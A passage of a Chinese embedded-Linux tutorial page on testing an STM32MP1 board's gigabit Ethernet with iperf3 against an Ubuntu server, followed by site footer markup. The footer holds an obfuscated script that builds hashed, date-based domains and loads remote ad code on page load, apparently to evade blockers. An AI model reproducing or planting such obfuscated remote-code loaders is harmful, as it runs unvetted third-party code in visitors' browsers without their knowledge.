+<p><img src="https://images2.imgbox.com/62/98/be9E80tF_o.png" alt="使能iperf3命令"></p> 
+<p>保存配置项，重新编译新的文件系统，使用新的文件系统启动开发板。</p> 
+<h4><a id="Ubuntuiperf3_1799"></a>Ubuntu下安装iperf3工具</h4> 
+<p>前面已经将iperf3工具移植到开发板了，接下来需要在Ubuntu下也安装iperf3 工具，因为Ubuntu系统默认没有安装这个工具，在Ubuntu系统中执行下面这条命令安装iperf3：</p> 
+<table><tbody><tr><td> sudo apt-get install iperf3 </td></tr></tbody></table> 
+<p>安装完成之后就可以进行测试了！</p> 
+<h4><a id="_1810"></a>测试</h4> 
+<p>在Ubuntu系统中执行下面这条命令，<strong>将Ubuntu系统作为iperf3的服务器</strong>，如下所示：</p> 
+<table><tbody><tr><td> iperf3 -s </td></tr></tbody></table> 
+<p>命令执行如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/84/0b/1cGhpC57_o.png" alt="将Ubuntu作为服务器"></p> 
+<p><strong>-s 表示将其作为服务器端</strong>。</p> 
+<p>接下来需要在开发板终端执行下面这条命令，将开发板作为客户端，并进行测试：</p> 
+<table><tbody><tr><td> iperf3 -c 192.168.1.250 </td></tr></tbody></table> 
+<p><strong>-c 选项表示将其作为客户端，后面紧跟着的就是服务器主机的IP地址，在这里也就是Ubuntu系统的IP地址</strong>，所以这个IP地址根据自己Ubuntu系统的IP进行填写即可，测试结果如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/4f/2c/5Tzgj7Zz_o.png" alt="开发板作为客户端测试结果"></p> 
+<p>上图中执行命令共打印出了10次带宽测试报告，每一秒钟报告一次带宽，耗费时间为10秒钟。最终测试出来发送和接收带宽分别为935M和934M，基本接近1000M的带宽，说明千M网络工作正常。</p> 
+<h2><a id="_1840"></a>总结</h2> 
+<p>这一章节的内容，基本就是<strong>底层的PHY芯片+STM32MP1内置的MAC芯片+RJ45座构成的完整嵌入式网络接口硬件。然后学习了PHY芯片的一些内容，在Linux内核中的网络通讯相关知识</strong>。</p> 
+<p>其实这一部分知识<strong>可以去看我之前的lwIP协议的学习，那边就是完整的一个在STM32单片机上的网络硬件+协议架构，会更加的详细和完整，当然了通讯协议的实现一个是lwIP，一个是在Linux内核</strong>。</p> 
+<p>最后完成了一下网络接口的测试，其实这一部分没啥好多说的，在当时移植Linux内核的时候就已经完成了网络的通讯移植，之后所有的linux驱动的测试都是挂载在nfs和tfts之上给开发板加载的，所以肯定是可以通讯的，主要是通过iperf3进行一下网速的测试。</p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/1c469adc19160966a7451a972372c4e1/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Solidity入门第一步之数据类型</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/6c0fc28e82862fba669f46313037082e/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Linux---进程</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
